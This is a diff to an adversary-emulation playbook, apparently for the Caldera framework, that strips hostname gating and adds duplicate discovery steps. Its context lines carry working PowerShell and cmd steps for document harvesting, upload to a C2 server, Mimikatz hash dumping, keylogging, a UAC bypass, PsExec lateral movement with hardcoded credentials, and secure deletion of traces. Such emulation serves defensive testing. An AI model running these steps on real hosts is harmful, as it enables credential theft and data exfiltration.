@@ -9,26 +9,6 @@
 
 # Scenario 1
 
-# Step 0 
-
-- id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
-  name: Initial Foothold Discovery
-  description: Dynamically captures the original host's name to gate early steps
-  tactic: discovery
-  technique:
-    attack_id: T1082
-    name: System Information Discovery
-  platforms:
-    windows:
-      cmd:
-        command: |
-          hostname
-        parsers:
-          plugins.stockpile.app.parsers.basic:
-          - source: initial_foothold_hostname
-            edge: has_fqdn
-            target: (.*)
-
 # Step 1 - Initial Breach
 
 - id: 571845f6-b75c-4b9d-a666-a78f7827261f
@@ -65,11 +45,7 @@
       description: IP or Hostname of server
       type: string
       default: 192.168.1.45
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname
-      edge: has_fqdn
-      target: DESKTOP-9JH44HD
+ 
   executors:
   - name: powershell
     command: |
@@ -105,11 +81,6 @@
             write-host "[*] PowerShell successfully spawned";
             exit 0;
           }
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname
-      edge: has_fqdn
-      target: DESKTOP-9JH44HD
 
 # Step 2 - Rapid Collection and Exfiltration
 
@@ -128,11 +99,7 @@
       psh,pwsh:
         command: |
           $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname
-      edge: has_fqdn
-      target: DESKTOP-9JH44HD
+
   executors:
   - name: powershell
     command: |
@@ -153,11 +120,7 @@
       cmd:
         command: |
           echo %USERDOMAIN%\%USERNAME%
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname
-      edge: has_fqdn
-      target: DESKTOP-9JH44HD
+
   executors:
   - name: command_prompt
     command: |
@@ -181,11 +144,6 @@
           Invoke-MultipartFormDataUpload -InFile "C:\Users\#{profile_user}\AppData\Roaming\Draft.zip" -Uri "#{server}/api/v2/payloads";
         payloads:
         - upload.ps1
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname
-      edge: has_fqdn
-      target: DESKTOP-9JH44HD
   input_arguments:
     profile_user:
       description: Name of profile user
@@ -221,11 +179,7 @@
           ProcessList
         payloads:
         - ps.ps1
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname
-      edge: has_fqdn
-      target: DESKTOP-9JH44HD
+
   executors:
   - name: powershell
     command: |
@@ -247,11 +201,6 @@
       cmd:
         command: |
           net user /domain
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname
-      edge: has_fqdn
-      target: DESKTOP-9JH44HD
 
   executors:
   - name: command_prompt
@@ -273,11 +222,7 @@
       cmd:
         command: |
           net user %USERNAME% /domain
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname
-      edge: has_fqdn
-      target: DESKTOP-9JH44HD
+
   executors:
   - name: command_prompt
     command: |
@@ -315,11 +260,7 @@
             }
         payloads:
         - monkey.png
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname
-      edge: has_fqdn
-      target: DESKTOP-9JH44HD
+
   input_arguments:
     profile_user:
       description: Name of profile user
@@ -372,11 +313,7 @@
 
           cmd.exe /c sdclt.exe;
           cmd.exe /c powershell.exe;
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname
-      edge: has_fqdn
-      target: DESKTOP-9JH44HD
+
   input_arguments:
     profile_user:
       description: Name of profile user
@@ -422,11 +359,6 @@
           if (!(test-path -path HKCU:\Software\Classes\Folder)) {
             write-host "[+] Reg keys removed!";
            }
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname
-      edge: has_fqdn
-      target: DESKTOP-9JH44HD
   executors:
   - name: powershell
     command: |
@@ -456,11 +388,7 @@
         payloads:
         - update.ps1
         - Invoke-PSInject.ps1
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname
-      edge: has_fqdn
-      target: DESKTOP-9JH44HD
+
   input_arguments:
     server:
       description: IP or Hostname of server
@@ -544,11 +472,7 @@
         timeout: 600
         payloads:
         - Modified-SysInternalsSuite.zip
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname
-      edge: has_fqdn
-      target: DESKTOP-9JH44HD
+
   input_arguments:
     profile_user:
       description: Name of profile user
@@ -630,11 +554,7 @@
           Set-Location -path "C:\Program Files\SysInternalsSuite";
           gci "$env:APPDATA";
           .\sdelete64.exe -accepteula "$env:APPDATA\Draft.Zip";
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname
-      edge: has_fqdn
-      target: DESKTOP-9JH44HD
+
   executors:
   - name: powershell
     command: |
@@ -672,11 +592,7 @@
           }
           . .\readme.ps1;
           Invoke-Discovery;
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname
-      edge: has_fqdn
-      target: DESKTOP-9JH44HD
+
   executors:
   - name: powershell
     command: |
@@ -718,11 +634,7 @@
               Invoke-Mimikatz -Command "privilege::debug token::elevate lsadump::sam exit"
           };
           hashdump;
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname
-      edge: has_fqdn
-      target: DESKTOP-9JH44HD
+
   executors:
   - name: powershell
     command: |
@@ -767,11 +679,7 @@
             write-host "[!] readme.ps1 not found.";
             exit 1;
           }
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname
-      edge: has_fqdn
-      target: DESKTOP-9JH44HD
+
   executors:
   - name: powershell
     command: |
@@ -816,11 +724,7 @@
             write-host "[!] readme.ps1 not found.";
             return 1;
           }
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname
-      edge: has_fqdn
-      target: DESKTOP-9JH44HD
+
   executors:
   - name: powershell
     command: |
@@ -858,11 +762,7 @@
 
           Set-Location -path "C:\Program Files\SysinternalsSuite";
           ./accesschk.exe -accepteula .;
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname
-      edge: has_fqdn
-      target: DESKTOP-9JH44HD
+
   executors:
   - name: powershell
     command: |
@@ -906,11 +806,7 @@
           }
         payloads:
         - dmevals.local.pfx
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname
-      edge: has_fqdn
-      target: DESKTOP-9JH44HD
+
   executors:
   - name: powershell
     command: |
@@ -956,11 +852,7 @@
             move-item .\psversion.txt psversion.ps1 -Force;
           }
             write-host "[+] File psversion.ps1 staged to be imported."
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname
-      edge: has_fqdn
-      target: DESKTOP-9JH44HD
+
   executors:
   - name: powershell
     command: |
@@ -997,11 +889,7 @@
           Set-Location -path "C:\Program Files\SysinternalsSuite";
           . .\psversion.ps1;
           Invoke-ScreenCapture; Start-Sleep -Seconds 3; View-Job -JobName "Screenshot";
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname
-      edge: has_fqdn
-      target: DESKTOP-9JH44HD
+
   executors:
   - name: powershell
     command: |
@@ -1035,11 +923,7 @@
           } else {
             write-host "[!] No clipboard data available!\n";
           }
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname
-      edge: has_fqdn
-      target: DESKTOP-9JH44HD
+
   executors:
   - name: powershell
     command: |
@@ -1074,11 +958,7 @@
           Get-Keystrokes;
           Start-Sleep -Seconds 15;
           View-Job -JobName "Keystrokes";
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname
-      edge: has_fqdn
-      target: DESKTOP-9JH44HD
+
   executors:
   - name: powershell
     command: |
@@ -1119,11 +999,7 @@
 
         payloads:
         - upload.ps1
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname
-      edge: has_fqdn
-      target: DESKTOP-9JH44HD
+
   input_arguments:
     profile_user:
       description: Name of profile user
@@ -1172,11 +1048,7 @@
           foreach($res in $results) {
             Write-Host $res.Properties.name;
           }
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname
-      edge: has_fqdn
-      target: DESKTOP-9JH44HD
+
   executors:
   - name: powershell
     command: |
@@ -1203,11 +1075,7 @@
       psh:
         command: |
           Enable-PSRemoting -Force; Set-Item WSMan:\localhost\Client\TrustedHosts -Value "DESKTOP-22K14OG" -Force; $username = "Administrator"; $password = "Password123!" | ConvertTo-SecureString -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential($username, $password); Invoke-Command -ComputerName "DESKTOP-22K14OG" -Credential $cred -Authentication Negotiate -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName, SessionId |  Where-Object { $_.UserName -like "*$env:USERNAME" } | Sort-Object SessionId -Unique } | Select-Object UserName, SessionId;
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname
-      edge: has_fqdn
-      target: DESKTOP-9JH44HD
+
   executors:
   - name: powershell
     command: |
@@ -1237,6 +1105,24 @@
       Move-item "C:\Users\Public\sandcat.exe" "\\DESKTOP-22K14OG\C$\Windows\Temp\python.exe" -Force; Set-Location -Path "C:\Program Files\SysInternalsSuite"; .\PsExec64.exe \\DESKTOP-22K14OG -u Administrator -p Password123! -accepteula -i 0 -d "C:\Windows\Temp\python.exe" -group pivot -server "http://192.168.1.45:443";
       tasklist /S DESKTOP-22K14OG /U Administrator /P Password123! /FI "IMAGENAME eq python.exe";
 
+- id: a1b2c3d4-e5f6-7890-abcd-ef1234567891
+  name: Hostname Discovery 1
+  description: Dynamically captures the original host's name to gate early steps
+  tactic: discovery
+  technique:
+    attack_id: T1082
+    name: System Information Discovery
+  platforms:
+    windows:
+      cmd:
+        command: |
+          hostname
+        parsers:
+          plugins.stockpile.app.parsers.basic:
+          - source: hostname
+            edge: has_fqdn
+            target: (.*)
+
 - id: 0b1841bd-ef8b-475c-bce7-8fcb2860984a
   name: Screen Capture (T1113)
   description: Native API call(s) were used to collect a screenshot.
@@ -1255,16 +1141,30 @@
           Get-Screenshot;
         payloads:
         - Get-Screenshot.ps1
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname
-      edge: has_fqdn
-      target: DESKTOP-22K14OG
+
   executors:
   - name: powershell
     command: |
       Import-Module .\Get-Screenshot.ps1 -Verbose -Force;
       Get-Screenshot;
+
+- id: a1b2c3d4-e5f6-7890-abcd-ef1234567891
+  name: Hostname Discovery 1
+  description: Dynamically captures the host's name
+  tactic: discovery
+  technique:
+    attack_id: T1082
+    name: System Information Discovery
+  platforms:
+    windows:
+      cmd:
+        command: |
+          hostname
+        parsers:
+          plugins.stockpile.app.parsers.basic:
+          - source: hostname
+            edge: has_fqdn
+            target: (.*)
 
 # Step 9 - Collection
 
@@ -1283,15 +1183,30 @@
       psh,pwsh:
         command: |
           ls \\DESKTOP-22K14OG\C$
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname
-      edge: has_fqdn
-      target: DESKTOP-22K14OG
+
   executors:
   - name: powershell
     command: |
       ls \\DESKTOP-22K14OG\C$
+
+- id: a1b2c3d4-e5f6-7890-abcd-ef1234567892
+  name: Hostname Discovery 2
+  description: Dynamically captures the host's name
+  tactic: discovery
+  technique:
+    attack_id: T1082
+    name: System Information Discovery
+  platforms:
+    windows:
+      cmd:
+        command: |
+          hostname
+        parsers:
+          plugins.stockpile.app.parsers.basic:
+          - source: hostname
+            edge: has_fqdn
+            target: (.*)
+
 
 - id: 08e57385-dbce-4850-8bb7-589ef79465ab
   name: Automated document collection (T1119)
@@ -1313,11 +1228,7 @@
           .\Rar.exe a -hpfGzq5yKw "$env:USERPROFILE\Desktop\working.zip" "$env:APPDATA\working.zip";
         payloads:
         - rar.exe
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname
-      edge: has_fqdn
-      target: DESKTOP-22K14OG
+
   executors:
   - name: powershell
     command: |
@@ -1325,6 +1236,24 @@
       $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\working.zip -Force;
       cd C:\Windows\Temp;
       .\Rar.exe a -hpfGzq5yKw "$env:USERPROFILE\Desktop\working.zip" "$env:APPDATA\working.zip";
+
+- id: a1b2c3d4-e5f6-7890-abcd-ef1234567893
+  name: Hostname Discovery 3
+  description: Dynamically captures the host's name
+  tactic: discovery
+  technique:
+    attack_id: T1082
+    name: System Information Discovery
+  platforms:
+    windows:
+      cmd:
+        command: |
+          hostname
+        parsers:
+          plugins.stockpile.app.parsers.basic:
+          - source: hostname
+            edge: has_fqdn
+            target: (.*)
 
 - id: 2d18c8ec-4593-49dc-9bf4-11d0673d6ae6
   name: Data from staged file (T1074) and Exfiltration over C2 Channel (T1041)
@@ -1346,11 +1275,7 @@
           remove-item upload.ps1 -Force
         payloads:
         - upload.ps1
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname 
-      edge: has_fqdn
-      target: DESKTOP-22K14OG
+
   input_arguments:
     profile_user:
       description: Name of profile user
@@ -1369,6 +1294,25 @@
       Invoke-MultipartFormDataUpload -InFile "C:\Users\#{profile_user}\Desktop\working.zip" -Uri "#{server}/api/v2/payloads";
     cleanup_command: |
       remove-item upload.ps1 -Force
+
+- id: a1b2c3d4-e5f6-7890-abcd-ef1234567894
+  name: Hostname Discovery 4
+  description: Dynamically captures the host's name
+  tactic: discovery
+  technique:
+    attack_id: T1082
+    name: System Information Discovery
+  platforms:
+    windows:
+      cmd:
+        command: |
+          hostname
+        parsers:
+          plugins.stockpile.app.parsers.basic:
+          - source: hostname
+            edge: has_fqdn
+            target: (.*)
+
 
 - id: 208b021b-c79a-4176-8ad1-3af99ed50c6f
   name: Artifact Cleanup - Delete Staged Files
@@ -1399,11 +1343,7 @@
           .\sdelete64.exe -accepteula C:\Users\#{profile_user}\AppData\Roaming\working.zip;
           .\sdelete64.exe -accepteula C:\Users\#{profile_user}\Desktop\working.zip;
           remove-item C:\Windows\Temp\sdelete64.exe -force;
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname
-      edge: has_fqdn
-      target: DESKTOP-22K14OG
+
   input_arguments:
     profile_user:
       description: Name of profile user
@@ -1429,6 +1369,7 @@
       .\sdelete64.exe -accepteula C:\Users\#{profile_user}\Desktop\working.zip;
       remove-item C:\Windows\Temp\sdelete64.exe -force;
 
+
 # Step 10 - Persistant Execution
 
 - id: 4b2e9574-b1a7-4b38-95b2-6054ded9c4fe
@@ -1447,16 +1388,31 @@
         command: |
           write-host "[*] Restarting Computer";
           Restart-Computer -Force;
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname
-      edge: has_fqdn
-      target: DESKTOP-9JH44HD
+
   executors:
   - name: powershell
     command: |
       write-host "[*] Restarting Computer";
       Restart-Computer -Force;
+
+- id: a1b2c3d4-e5f6-7890-abcd-ef1234567895
+  name: Hostname Discovery 5
+  description: Dynamically captures the host's name
+  tactic: discovery
+  technique:
+    attack_id: T1082
+    name: System Information Discovery
+  platforms:
+    windows:
+      cmd:
+        command: |
+          hostname
+        parsers:
+          plugins.stockpile.app.parsers.basic:
+          - source: hostname
+            edge: has_fqdn
+            target: (.*)
+
 
 - id: 4bedbd9b-a570-4f9f-b78a-2f7f99ad5e92
   name: Artifact Cleanup
@@ -1497,11 +1453,6 @@
               write-host "[*] Job \"screenshot\" does not exist, thus was not removed.";
           }
           remove-item upload.ps1 -Force;
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname
-      edge: has_fqdn
-      target: DESKTOP-9JH44HD
 
   executors:
   - name: powershell
@@ -1532,6 +1483,24 @@
       }
       remove-item upload.ps1 -Force;
 
+- id: a1b2c3d4-e5f6-7890-abcd-ef1234567896
+  name: Hostname Discovery 6
+  description: Dynamically captures the host's name
+  tactic: discovery
+  technique:
+    attack_id: T1082
+    name: System Information Discovery
+  platforms:
+    windows:
+      cmd:
+        command: |
+          hostname
+        parsers:
+          plugins.stockpile.app.parsers.basic:
+          - source: hostname
+            edge: has_fqdn
+            target: (.*)
+
 - id: 00446217-53ca-4749-bacd-f41fe189d36e
   name: Startup Folder Persistence Execution
   description: Sets credentials for a headless RDP session to spawn triggering startup folder persistence.
@@ -1547,15 +1516,10 @@
       psh,pwsh:
         command: |
           cmdkey /add:127.0.0.2 /user:#{profile_user} /pass:#{profile_user_password};
-          mstsc /v:127.0.0.2;
-          sleep 10;
-          Get-Process -name mstsc;
-          if ($?) { taskkill.exe /F /IM mstsc.exe; exit 0; } else {exit 1;}
-  requirements:
-  - plugins.stockpile.app.requirements.basic:
-    - source: initial_foothold_hostname
-      edge: has_fqdn
-      target: DESKTOP-22K14OG
+          Start-Process mstsc.exe -ArgumentList "/v:127.0.0.2";
+          Start-Sleep 3;
+          if (Get-Process mstsc -ErrorAction SilentlyContinue) { taskkill /F /IM mstsc.exe };
+          exit 0;
 
   input_arguments:
     profile_user:
@@ -1572,7 +1536,7 @@
   - name: powershell
     command: |
       cmdkey /add:127.0.0.2 /user:#{profile_user} /pass:#{profile_user_password};
-      mstsc /v:127.0.0.2;
-      sleep 10;
-      Get-Process -name mstsc;
-      if ($?) { taskkill.exe /F /IM mstsc.exe; exit 0; } else {exit 1;}
+      Start-Process mstsc.exe -ArgumentList "/v:127.0.0.2";
+      Start-Sleep 3;
+      if (Get-Process mstsc -ErrorAction SilentlyContinue) { taskkill /F /IM mstsc.exe };
+      exit 0;
